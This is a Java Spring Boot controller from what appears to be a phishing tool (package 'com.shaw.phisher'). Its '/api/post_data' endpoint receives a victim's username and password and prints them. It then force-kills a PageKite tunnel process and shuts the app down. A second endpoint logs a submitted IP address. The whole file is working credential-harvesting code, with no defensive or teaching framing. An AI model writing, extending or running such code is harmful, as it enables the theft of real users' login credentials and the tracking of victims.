package com.shaw.phisher.controllers;

import com.shaw.phisher.PhisherApplication;
import com.shaw.phisher.models.DataModel;
import com.shaw.phisher.models.IpModel;
import com.shaw.phisher.utils.Command;
import com.shaw.phisher.utils.Operations;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class DataController {
    @PostMapping("/api/post_data")
    public void postedDetails(@RequestBody DataModel dataModel) {
        System.out.println("Username: " + dataModel.getUsername());
        System.out.println("Password: " + dataModel.getPassword());

        if (Command.pagekiteProcess != null)
            Command.pagekiteProcess.destroyForcibly();

        PhisherApplication.ctx.close();
    }

    @PostMapping("/api/post_ip")
    public void postedDetails(@RequestBody IpModel ipModel) {
        System.out.println("IP Address: " + ipModel.getIp());
    }
}
